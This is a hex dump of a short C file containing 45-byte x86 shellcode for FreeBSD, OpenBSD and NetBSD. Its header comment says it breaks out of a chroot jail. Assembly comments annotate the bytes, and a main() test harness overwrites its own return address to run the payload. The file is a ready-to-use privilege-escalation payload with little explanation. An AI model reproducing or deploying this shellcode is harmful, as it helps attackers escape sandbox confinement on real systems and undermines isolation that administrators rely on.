00000000  2f 2a 0d 0a 20 20 20 2a  42 53 44 20 76 65 72 73  |/*..   *BSD vers|
00000010  69 6f 6e 0d 0a 20 20 20  46 72 65 65 42 53 44 2c  |ion..   FreeBSD,|
00000020  20 4f 70 65 6e 42 53 44  2c 20 4e 65 74 42 53 44  | OpenBSD, NetBSD|
00000030  2e 0d 0a 0d 0a 20 20 20  73 30 74 34 69 70 76 36  |.....   s0t4ipv6|
00000040  40 73 68 65 6c 6c 63 6f  64 65 2e 63 6f 6d 2e 61  |@shellcode.com.a|
00000050  72 0d 0a 0d 0a 20 20 20  34 35 20 62 79 74 65 73  |r....   45 bytes|
00000060  2e 0d 0a 0d 0a 20 20 20  2d 62 72 65 61 6b 20 63  |.....   -break c|
00000070  68 72 6f 6f 74 65 64 0d  0a 2a 2f 0d 0a 0d 0a 63  |hrooted..*/....c|
00000080  68 61 72 20 73 68 65 6c  6c 63 6f 64 65 5b 5d 3d  |har shellcode[]=|
00000090  0d 0a 0d 0a 20 20 20 20  22 5c 78 36 38 5c 78 36  |....    "\x68\x6|
000000a0  32 5c 78 32 65 5c 78 32  65 5c 78 32 65 22 20 2f  |2\x2e\x2e\x2e" /|
000000b0  2a 20 70 75 73 68 6c 20  20 20 24 30 78 32 65 32  |* pushl   $0x2e2|
000000c0  65 32 65 36 32 20 20 20  20 20 20 20 20 20 20 20  |e2e62           |
000000d0  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 38 39 5c 78  | */..    "\x89\x|
000000e0  65 37 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |e7"             |
000000f0  2f 2a 20 6d 6f 76 6c 20  20 20 20 25 65 73 70 2c  |/* movl    %esp,|
00000100  25 65 64 69 20 20 20 20  20 20 20 20 20 20 20 20  |%edi            |
00000110  20 20 2a 2f 0d 0a 20 20  20 20 22 5c 78 33 33 5c  |  */..    "\x33\|
00000120  78 63 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |xc0"            |
00000130  20 2f 2a 20 78 6f 72 6c  20 20 20 20 25 65 61 78  | /* xorl    %eax|
00000140  2c 25 65 61 78 20 20 20  20 20 20 20 20 20 20 20  |,%eax           |
00000150  20 20 20 2a 2f 0d 0a 20  20 20 20 22 5c 78 38 38  |   */..    "\x88|
00000160  5c 78 34 37 5c 78 30 33  22 20 20 20 20 20 20 20  |\x47\x03"       |
00000170  20 20 2f 2a 20 6d 6f 76  62 20 20 20 20 25 61 6c  |  /* movb    %al|
00000180  2c 30 78 33 28 25 65 64  69 29 20 20 20 20 20 20  |,0x3(%edi)      |
00000190  20 20 20 20 2a 2f 0d 0a  20 20 20 20 22 5c 78 35  |    */..    "\x5|
000001a0  37 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |7"              |
000001b0  20 20 20 2f 2a 20 70 75  73 68 6c 20 20 20 25 65  |   /* pushl   %e|
000001c0  64 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |di              |
000001d0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 22 5c 78  |     */..    "\x|
000001e0  62 30 5c 78 38 38 22 20  20 20 20 20 20 20 20 20  |b0\x88"         |
000001f0  20 20 20 20 2f 2a 20 6d  6f 76 62 20 20 20 20 24  |    /* movb    $|
00000200  30 78 38 38 2c 25 61 6c  20 20 20 20 20 20 20 20  |0x88,%al        |
00000210  20 20 20 20 20 20 2a 2f  0d 0a 20 20 20 20 22 5c  |      */..    "\|
00000220  78 35 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x50"            |
00000230  20 20 20 20 20 2f 2a 20  70 75 73 68 6c 20 20 20  |     /* pushl   |
00000240  25 65 61 78 20 20 20 20  20 20 20 20 20 20 20 20  |%eax            |
00000250  20 20 20 20 20 20 20 2a  2f 0d 0a 20 20 20 20 22  |       */..    "|
00000260  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000270  20 20 20 20 20 20 2f 2a  20 69 6e 74 20 20 20 20  |      /* int    |
00000280  20 24 30 78 38 30 20 20  20 20 20 20 20 20 20 20  | $0x80          |
00000290  20 20 20 20 20 20 20 20  2a 2f 0d 0a 20 20 20 20  |        */..    |
000002a0  22 5c 78 35 37 22 20 20  20 20 20 20 20 20 20 20  |"\x57"          |
000002b0  20 20 20 20 20 20 20 2f  2a 20 70 75 73 68 6c 20  |       /* pushl |
000002c0  20 20 25 65 64 69 20 20  20 20 20 20 20 20 20 20  |  %edi          |
000002d0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
000002e0  20 22 5c 78 62 30 5c 78  33 64 22 20 20 20 20 20  | "\xb0\x3d"     |
000002f0  20 20 20 20 20 20 20 20  2f 2a 20 6d 6f 76 62 20  |        /* movb |
00000300  20 20 20 24 30 78 33 64  2c 25 61 6c 20 20 20 20  |   $0x3d,%al    |
00000310  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 20 20  |          */..  |
00000320  20 20 22 5c 78 35 30 22  20 20 20 20 20 20 20 20  |  "\x50"        |
00000330  20 20 20 20 20 20 20 20  20 2f 2a 20 70 75 73 68  |         /* push|
00000340  6c 20 20 20 25 65 61 78  20 20 20 20 20 20 20 20  |l   %eax        |
00000350  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |           */.. |
00000360  20 20 20 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |   "\xcd\x80"   |
00000370  20 20 20 20 20 20 20 20  20 20 2f 2a 20 69 6e 74  |          /* int|
00000380  20 20 20 20 20 24 30 78  38 30 20 20 20 20 20 20  |     $0x80      |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
000003a0  20 20 20 20 22 5c 78 34  37 22 20 20 20 20 20 20  |    "\x47"      |
000003b0  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 69 6e  |           /* in|
000003c0  63 6c 20 20 20 20 25 65  64 69 20 20 20 20 20 20  |cl    %edi      |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
000003e0  0a 20 20 20 20 22 5c 78  33 33 5c 78 63 39 22 20  |.    "\x33\xc9" |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 78  |            /* x|
00000400  6f 72 6c 20 20 20 20 25  65 63 78 2c 25 65 63 78  |orl    %ecx,%ecx|
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |              */|
00000420  0d 0a 20 20 20 20 22 5c  78 62 31 5c 78 66 66 22  |..    "\xb1\xff"|
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
00000440  6d 6f 76 62 20 20 20 20  24 30 78 66 66 2c 25 63  |movb    $0xff,%c|
00000450  6c 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |l              *|
00000460  2f 0d 0a 20 20 20 20 22  5c 78 35 37 22 20 20 20  |/..    "\x57"   |
00000470  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000480  20 70 75 73 68 6c 20 20  20 25 65 64 69 20 20 20  | pushl   %edi   |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004a0  2a 2f 0d 0a 20 20 20 20  22 5c 78 35 30 22 20 20  |*/..    "\x50"  |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000004c0  2a 20 70 75 73 68 6c 20  20 20 25 65 61 78 20 20  |* pushl   %eax  |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004e0  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 62 30 5c 78  | */..    "\xb0\x|
000004f0  30 63 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |0c"             |
00000500  2f 2a 20 6d 6f 76 62 20  20 20 20 24 30 78 30 63  |/* movb    $0x0c|
00000510  2c 25 61 6c 20 20 20 20  20 20 20 20 20 20 20 20  |,%al            |
00000520  20 20 2a 2f 0d 0a 20 20  20 20 22 5c 78 63 64 5c  |  */..    "\xcd\|
00000530  78 38 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x80"            |
00000540  20 2f 2a 20 69 6e 74 20  20 20 20 20 24 30 78 38  | /* int     $0x8|
00000550  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0               |
00000560  20 20 20 2a 2f 0d 0a 20  20 20 20 22 5c 78 65 32  |   */..    "\xe2|
00000570  5c 78 66 61 22 20 20 20  20 20 20 20 20 20 20 20  |\xfa"           |
00000580  20 20 2f 2a 20 6c 6f 6f  70 20 20 20 20 3c 73 68  |  /* loop    <sh|
00000590  65 6c 6c 63 6f 64 65 20  2b 33 31 3e 20 20 20 20  |ellcode +31>    |
000005a0  20 20 20 20 2a 2f 0d 0a  20 20 20 20 22 5c 78 34  |    */..    "\x4|
000005b0  37 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |7"              |
000005c0  20 20 20 2f 2a 20 69 6e  63 6c 20 20 20 20 25 65  |   /* incl    %e|
000005d0  64 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |di              |
000005e0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 22 5c 78  |     */..    "\x|
000005f0  35 37 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |57"             |
00000600  20 20 20 20 2f 2a 20 70  75 73 68 6c 20 20 20 25  |    /* pushl   %|
00000610  65 64 69 20 20 20 20 20  20 20 20 20 20 20 20 20  |edi             |
00000620  20 20 20 20 20 20 2a 2f  0d 0a 20 20 20 20 22 5c  |      */..    "\|
00000630  78 62 30 5c 78 33 64 22  20 20 20 20 20 20 20 20  |xb0\x3d"        |
00000640  20 20 20 20 20 2f 2a 20  6d 6f 76 62 20 20 20 20  |     /* movb    |
00000650  24 30 78 33 64 2c 25 61  6c 20 20 20 20 20 20 20  |$0x3d,%al       |
00000660  20 20 20 20 20 20 20 2a  2f 0d 0a 20 20 20 20 22  |       */..    "|
00000670  5c 78 35 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x50"           |
00000680  20 20 20 20 20 20 2f 2a  20 70 75 73 68 6c 20 20  |      /* pushl  |
00000690  20 25 65 61 78 20 20 20  20 20 20 20 20 20 20 20  | %eax           |
000006a0  20 20 20 20 20 20 20 20  2a 2f 0d 0a 20 20 20 20  |        */..    |
000006b0  22 5c 78 63 64 5c 78 38  30 22 3b 20 20 20 20 20  |"\xcd\x80";     |
000006c0  20 20 20 20 20 20 20 2f  2a 20 69 6e 74 20 20 20  |       /* int   |
000006d0  20 20 24 30 78 38 30 20  20 20 20 20 20 20 20 20  |  $0x80         |
000006e0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 0d 0a 6d  |         */....m|
000006f0  61 69 6e 28 29 0d 0a 7b  0d 0a 20 20 20 69 6e 74  |ain()..{..   int|
00000700  20 2a 72 65 74 3b 0d 0a  20 20 20 70 72 69 6e 74  | *ret;..   print|
00000710  66 28 22 53 68 65 6c 6c  63 6f 64 65 20 6c 65 6e  |f("Shellcode len|
00000720  67 68 74 3d 25 64 5c 6e  22 2c 73 69 7a 65 6f 66  |ght=%d\n",sizeof|
00000730  28 73 68 65 6c 6c 63 6f  64 65 29 29 3b 0d 0a 20  |(shellcode));.. |
00000740  20 20 72 65 74 3d 28 69  6e 74 2a 29 26 72 65 74  |  ret=(int*)&ret|
00000750  2b 32 3b 0d 0a 20 20 20  28 2a 72 65 74 29 3d 28  |+2;..   (*ret)=(|
00000760  69 6e 74 29 73 68 65 6c  6c 63 6f 64 65 3b 0d 0a  |int)shellcode;..|
00000770  7d                                                |}|
00000771
